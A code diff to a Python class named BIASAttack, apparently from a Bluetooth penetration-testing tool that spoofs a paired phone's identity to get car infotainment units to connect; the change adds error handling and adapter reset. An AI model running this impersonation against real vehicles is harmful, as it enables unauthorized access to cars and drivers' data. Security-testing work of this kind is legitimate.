@@ -133,23 +133,24 @@ class BIASAttack:
                     self.hci, self.phone_address,
                     self.phone_name or "Phone", "0x5a020c",
                 )
-                enable_page_scan(self.hci)
+                try:
+                    enable_page_scan(self.hci)
 
-                end_time = time.time() + 15
-                while time.time() < end_time:
-                    verify = run_cmd(["bluetoothctl", "info", self.ivi_address])
-                    if "Connected: yes" in verify.stdout:
-                        result["auto_reconnects"] = True
-                        success("IVI auto-reconnected to spoofed identity!")
-                        result["notes"].append("Auto-reconnect: IVI initiates connection to spoofed phone")
-                        break
-                    time.sleep(2)
+                    end_time = time.time() + 15
+                    while time.time() < end_time:
+                        verify = run_cmd(["bluetoothctl", "info", self.ivi_address])
+                        if "Connected: yes" in verify.stdout:
+                            result["auto_reconnects"] = True
+                            success("IVI auto-reconnected to spoofed identity!")
+                            result["notes"].append("Auto-reconnect: IVI initiates connection to spoofed phone")
+                            break
+                        time.sleep(2)
 
-                if not result["auto_reconnects"]:
-                    info("IVI did not auto-reconnect (normal — we'll initiate instead)")
-
-                # Reset adapter
-                adapter_reset(self.hci)
+                    if not result["auto_reconnects"]:
+                        info("IVI did not auto-reconnect (normal — we'll initiate instead)")
+                finally:
+                    # Always reset adapter even if probing crashed
+                    adapter_reset(self.hci)
 
             # Summary
             summary_panel("BIAS Probe Results", {
@@ -229,14 +230,20 @@ class BIASAttack:
                     f"connect {self.ivi_address}",
                     "quit",
                 ])
-                proc_result = subprocess.run(
-                    ["bluetoothctl"],
-                    input=bt_commands,
-                    capture_output=True,
-                    text=True,
-                    timeout=30,
-                    errors="replace",
-                )
+                try:
+                    proc_result = subprocess.run(
+                        ["bluetoothctl"],
+                        input=bt_commands,
+                        capture_output=True,
+                        text=True,
+                        timeout=30,
+                        errors="replace",
+                    )
+                except subprocess.TimeoutExpired:
+                    error("bluetoothctl timed out after 30s — BIAS connection may be incomplete")
+                    run_cmd(["bluetoothctl", "cancel-pairing", self.ivi_address], timeout=5)
+                    results["notes"].append("bluetoothctl timed out")
+                    return results
                 output = proc_result.stdout + proc_result.stderr
                 verbose(f"bluetoothctl output:\n{output.strip()}")
 
